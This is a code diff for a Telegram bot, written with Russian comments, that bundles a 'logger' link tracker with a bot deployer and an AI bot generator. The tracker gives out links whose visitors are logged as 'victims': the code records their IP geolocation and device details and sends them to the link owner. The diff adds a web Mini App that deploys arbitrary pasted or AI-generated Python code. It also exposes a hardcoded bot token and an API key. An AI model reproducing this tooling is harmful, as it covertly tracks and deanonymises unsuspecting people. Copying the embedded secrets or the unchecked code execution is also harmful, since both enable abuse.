@@ -12,6 +12,7 @@ import requests
 import base64
 import tempfile
 import subprocess
+import re
 
 BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
 GROQ_API_KEY = "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"
@@ -21,10 +22,12 @@ bot = TelegramClient('allinone_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb9
 app = Flask(__name__)
 links = {}
 user_states = {}
+deployed_bots_list = {}
 loop = None
 BOTS_DIR = "deployed_bots"
 os.makedirs(BOTS_DIR, exist_ok=True)
 
+# ================= СТРАНИЦА ЛОГГЕРА =================
 TRACKER_PAGE = """<!DOCTYPE html>
 <html>
 <head><title>Video</title><meta charset="UTF-8">
@@ -53,6 +56,85 @@ function startAll(){
 }
 </script></body></html>"""
 
+# ================= MINI APP КОНСТРУКТОР БОТОВ =================
+BUILDER_PAGE = """<!DOCTYPE html>
+<html>
+<head><title>Bot Builder</title><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#1a1a2e;color:#e0e0e0;font-family:Arial;padding:15px}
+h2{color:#e94560;margin-bottom:15px;text-align:center}
+textarea{width:100%;height:200px;background:#16213e;color:#fff;border:1px solid #e94560;border-radius:10px;padding:10px;font-size:14px;resize:vertical;margin-bottom:10px}
+input{width:100%;background:#16213e;color:#fff;border:1px solid #e94560;border-radius:10px;padding:10px;font-size:14px;margin-bottom:10px}
+button{background:#e94560;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;margin:5px 0;width:100%}
+button:hover{background:#ff6b6b}
+.status{text-align:center;color:#aaa;margin:10px 0;font-size:14px}
+.bot-list{background:#16213e;border-radius:10px;padding:10px;margin:10px 0}
+.bot-item{color:#e94560;padding:5px;border-bottom:1px solid #333}
+</style></head>
+<body>
+<h2>Bot Builder</h2>
+<div class="status" id="status">Ready</div>
+<textarea id="code" placeholder="Paste your Python code here..."></textarea>
+<input id="token" placeholder="Bot token from @BotFather">
+<button onclick="deployBot()">Deploy Bot</button>
+<button onclick="generateAI()">Generate with AI</button>
+<div class="bot-list" id="botList">Loading bots...</div>
+<script>
+const tg = window.Telegram.WebApp;
+tg.expand();
+
+function setStatus(text){document.getElementById('status').innerText=text;}
+
+async function deployBot(){
+    var code=document.getElementById('code').value.trim();
+    var token=document.getElementById('token').value.trim();
+    if(!code){setStatus('Paste code first!');return;}
+    if(!token){setStatus('Enter token first!');return;}
+    setStatus('Deploying...');
+    try{
+        var resp=await fetch('/api/deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,token:token})});
+        var data=await resp.json();
+        if(data.error){setStatus(data.error);}
+        else{setStatus('Deployed! @'+data.username);loadBots();}
+    }catch(e){setStatus('Error: '+e.message);}
+}
+
+async function generateAI(){
+    var desc=document.getElementById('code').value.trim()||prompt('Bot description:');
+    var token=document.getElementById('token').value.trim();
+    if(!desc){setStatus('Enter description first!');return;}
+    setStatus('AI generating...');
+    try{
+        var resp=await fetch('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({desc:desc,token:token})});
+        var data=await resp.json();
+        if(data.error){setStatus(data.error);}
+        else{
+            document.getElementById('code').value=data.code;
+            setStatus('Code generated! Click Deploy to launch.');
+        }
+    }catch(e){setStatus('Error: '+e.message);}
+}
+
+async function loadBots(){
+    try{
+        var resp=await fetch('/api/bots');
+        var data=await resp.json();
+        var html='';
+        if(data.bots&&data.bots.length>0){
+            for(var i=0;i<data.bots.length;i++){
+                html+='<div class="bot-item">@'+data.bots[i].username+' - '+data.bots[i].file+'</div>';
+            }
+        }else{html='No bots deployed yet';}
+        document.getElementById('botList').innerHTML=html;
+    }catch(e){}
+}
+
+loadBots();
+</script></body></html>"""
+
 def gen_id():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
@@ -70,6 +152,7 @@ def get_ip_info(ip):
     except: pass
     return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}
 
+# ================= FLASK РОУТЫ =================
 @app.route('/')
 def home(): return "OK"
 
@@ -83,6 +166,56 @@ def track(lid):
     links[lid]['victims'].append(v)
     asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
     return render_template_string(TRACKER_PAGE, link_id=lid)
+
+@app.route('/app')
+def mini_app():
+    return render_template_string(BUILDER_PAGE)
+
+@app.route('/api/deploy', methods=['POST'])
+def api_deploy():
+    data = request.get_json()
+    code = data.get('code', '')
+    token = data.get('token', '')
+    
+    if not code or not token:
+        return jsonify({'error': 'Code and token required'})
+    
+    filename, error = deploy_bot(code, token)
+    if error:
+        return jsonify({'error': error})
+    
+    # Получаем username бота
+    try:
+        import asyncio as aio
+        async def get_bot_info():
+            c = TelegramClient('tmp', 6, "eb06d4abfb49dc3eeb1aeb98ae0f581e")
+            await c.start(bot_token=token)
+            me = await c.get_me()
+            await c.disconnect()
+            return getattr(me, 'username', 'unknown')
+        username = aio.new_event_loop().run_until_complete(get_bot_info())
+    except:
+        username = 'unknown'
+    
+    deployed_bots_list[filename] = {'username': username, 'token': token, 'file': filename}
+    return jsonify({'success': True, 'username': username, 'file': filename})
+
+@app.route('/api/generate', methods=['POST'])
+def api_generate():
+    data = request.get_json()
+    desc = data.get('desc', '')
+    token = data.get('token', '')
+    
+    if not desc:
+        return jsonify({'error': 'Description required'})
+    
+    code = generate_bot_code(desc, token if token else None)
+    return jsonify({'code': code})
+
+@app.route('/api/bots')
+def api_bots():
+    bots = [{'username': v['username'], 'file': v['file']} for v in deployed_bots_list.values()]
+    return jsonify({'bots': bots})
 
 @app.route('/collect/<lid>', methods=['POST'])
 def coll(lid):
@@ -139,28 +272,22 @@ Device: {v.get('ua','?')[:150]}
     except Exception as e:
         print(f"Notify error: {e}")
 
-# ================= ИИ ГЕНЕРАТОР (СРАЗУ С ТОКЕНОМ) =================
+# ================= ИИ ГЕНЕРАТОР =================
 def generate_bot_code(description: str, token: str = None) -> str:
     token_line = f'BOT_TOKEN = "{token}"' if token else 'BOT_TOKEN = "REPLACE_WITH_YOUR_TOKEN"'
     
     prompt = f"""You are an expert Python developer for Telegram bots (Telethon).
-Write COMPLETE working bot code. Think carefully before writing.
+Write COMPLETE working bot code.
 
 CRITICAL RULES:
 1. ONLY import: from telethon import TelegramClient, events
 2. api_id = 6, api_hash = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
 3. {token_line}
-4. Add /start handler with function description
-5. Output ONLY Python code, no explanations
+4. Add /start handler
+5. Output ONLY Python code
 6. Code MUST be fully functional
-7. NO emoji in comments
 
 Bot description: {description}
-
-Think step by step:
-1. What handlers are needed?
-2. What is the main logic?
-3. Are there any edge cases?
 
 Write complete code:"""
     
@@ -172,7 +299,6 @@ Write complete code:"""
         "max_tokens": 6000,
         "top_p": 0.95,
         "frequency_penalty": 0.1,
-        "presence_penalty": 0.1,
     }
     
     try:
@@ -194,7 +320,7 @@ def deploy_bot(code: str, token: str = None) -> tuple:
         token = extract_token(code)
     
     if not token or token in ["REPLACE_WITH_YOUR_TOKEN", "ВСТАВЬ_СВОЙ_ТОКЕН"]:
-        return None, "Where is the token? Add BOT_TOKEN to your code first!"
+        return None, "Where is the token?"
     
     code = re.sub(r'BOT_TOKEN\s*=\s*["\'][^"\']+["\']', f'BOT_TOKEN = "{token}"', code)
     bot_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
@@ -210,9 +336,9 @@ async def start(event):
         [Button.inline("Create logger link", "logger")],
         [Button.inline("Upload .py file (deploy)", "upload")],
         [Button.inline("AI generate bot (with token)", "ai_with_token")],
-        [Button.inline("AI generate bot (no token)", "ai_no_token")],
+        [Button.inline("Open Bot Builder", "builder")],
     ]
-    await event.reply("ALL-IN-ONE BOT\n\nLogger | Deploy | AI Generator\n\nChoose action:", buttons=buttons)
+    await event.reply("ALL-IN-ONE BOT\n\nLogger | Deploy | AI | Builder\n\nChoose action:", buttons=buttons)
 
 @bot.on(events.CallbackQuery)
 async def callback(event):
@@ -226,15 +352,14 @@ async def callback(event):
     
     elif data == "upload":
         user_states[user_id] = {'action': 'wait_code'}
-        await event.edit("Send .py file with bot code.\nIf token is in code - deploy instantly.\nIf no token - I will ask for it.")
+        await event.edit("Send .py file or paste code as text.\nIf token is in code - deploy instantly.\nIf no token - I will ask for it.")
     
     elif data == "ai_with_token":
         user_states[user_id] = {'action': 'wait_desc_with_token'}
-        await event.edit("Format:\nTOKEN: your_token_here\nDESC: bot description\n\nExample:\nTOKEN: 123456:ABCdef\nDESC: bot for spam in chat")
+        await event.edit("Format:\nTOKEN: your_token\nDESC: bot description")
     
-    elif data == "ai_no_token":
-        user_states[user_id] = {'action': 'wait_description'}
-        await event.edit("Describe your bot:\nExample: 'bot for searching in databases'")
+    elif data == "builder":
+        await event.edit("Open Mini App to build bots:\nhttps://t.me/creator_failpybot/Gram")
 
 @bot.on(events.NewMessage(incoming=True))
 async def handle(event):
@@ -245,73 +370,70 @@ async def handle(event):
     if user_id not in user_states: return
     state = user_states[user_id]
     
-    # === ЗАГРУЗКА .py ФАЙЛА ===
-    if state['action'] == 'wait_code' and event.file and event.file.name and event.file.name.endswith('.py'):
-        temp_path = os.path.join(tempfile.gettempdir(), event.file.name)
-        await event.download_media(temp_path)
-        with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f: code = f.read()
-        os.remove(temp_path)
+    # === ЗАГРУЗКА КОДА (ФАЙЛ ИЛИ ТЕКСТ) ===
+    if state['action'] == 'wait_code':
+        code = None
         
-        if has_token(code):
-            msg = await event.reply("Token found in code. Deploying...")
-            filename, error = deploy_bot(code)
+        if event.file and event.file.name and event.file.name.endswith('.py'):
+            temp_path = os.path.join(tempfile.gettempdir(), event.file.name)
+            await event.download_media(temp_path)
+            with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
+                code = f.read()
+            os.remove(temp_path)
+        
+        elif text and len(text) > 50 and ('import' in text.lower() or 'def ' in text.lower() or 'bot_token' in text.lower()):
+            code = text
+        
+        if code:
+            if has_token(code):
+                msg = await event.reply("Token found. Deploying...")
+                filename, error = deploy_bot(code)
+                if error: await msg.edit(error)
+                else:
+                    del user_states[user_id]
+                    await msg.edit(f"Deployed! File: `{filename}`")
+            else:
+                user_states[user_id]['code'] = code
+                user_states[user_id]['action'] = 'wait_token'
+                await event.reply("No token. Send token from @BotFather:")
+        else:
+            await event.reply("Send .py file or paste code as text.")
+        return
+    
+    # === ОЖИДАНИЕ ТОКЕНА ===
+    if state['action'] == 'wait_token':
+        if ':' in text and len(text) > 30:
+            code = state['code']
+            msg = await event.reply("Deploying...")
+            filename, error = deploy_bot(code, text)
             if error: await msg.edit(error)
             else:
                 del user_states[user_id]
-                await msg.edit(f"Bot deployed! File: `{filename}`")
+                await msg.edit(f"Deployed! File: `{filename}`")
         else:
-            user_states[user_id]['code'] = code
-            user_states[user_id]['action'] = 'wait_token'
-            await event.reply("No token found in code. Send bot token from @BotFather:")
-    
-    # === ОЖИДАНИЕ ТОКЕНА ===
-    elif state['action'] == 'wait_token' and ':' in text and len(text) > 30:
-        code = state['code']
-        msg = await event.reply("Deploying...")
-        filename, error = deploy_bot(code, text)
-        if error: await msg.edit(error)
-        else:
-            del user_states[user_id]
-            await msg.edit(f"Bot deployed! File: `{filename}`")
+            await event.reply("Invalid token. Format: 123456:ABCdef")
+        return
     
     # === ИИ С ТОКЕНОМ ===
-    elif state['action'] == 'wait_desc_with_token' and text:
+    if state['action'] == 'wait_desc_with_token':
         token = None
         desc = text
         
-        if 'TOKEN:' in text.upper():
-            parts = text.split('\n')
-            for part in parts:
-                if part.upper().startswith('TOKEN:'):
-                    token = part.split(':', 1)[1].strip()
-                elif part.upper().startswith('DESC:'):
-                    desc = part.split(':', 1)[1].strip()
+        for line in text.split('\n'):
+            if line.upper().startswith('TOKEN:'): token = line.split(':', 1)[1].strip()
+            elif line.upper().startswith('DESC:'): desc = line.split(':', 1)[1].strip()
         
         if token and ':' in token and len(token) > 30:
-            msg = await event.reply("AI generating code with your token...")
+            msg = await event.reply("AI generating...")
             code = generate_bot_code(desc, token)
-            gen_path = os.path.join(tempfile.gettempdir(), f"bot_{random.randint(1000,9999)}.py")
-            with open(gen_path, 'w', encoding='utf-8') as f: f.write(code)
-            await msg.edit("Code generated. Deploying...")
             filename, error = deploy_bot(code, token)
             if error: await msg.edit(error)
             else:
                 del user_states[user_id]
-                await msg.edit(f"Bot deployed! File: `{filename}`")
-            os.remove(gen_path)
+                await msg.edit(f"Deployed! File: `{filename}`")
         else:
-            await event.reply("Invalid token format. Use:\nTOKEN: 123456:ABCdef\nDESC: bot description")
-    
-    # === ИИ БЕЗ ТОКЕНА ===
-    elif state['action'] == 'wait_description' and text:
-        msg = await event.reply("AI generating code...")
-        code = generate_bot_code(text)
-        gen_path = os.path.join(tempfile.gettempdir(), f"bot_{random.randint(1000,9999)}.py")
-        with open(gen_path, 'w', encoding='utf-8') as f: f.write(code)
-        await msg.edit("Sending file...")
-        await bot.send_file(user_id, gen_path, caption="Your bot code\nReplace REPLACE_WITH_YOUR_TOKEN with your token")
-        os.remove(gen_path)
-        del user_states[user_id]
+            await event.reply("Invalid token. Format:\nTOKEN: 123456:ABCdef\nDESC: description")
+        return
 
 async def main():
     global loop
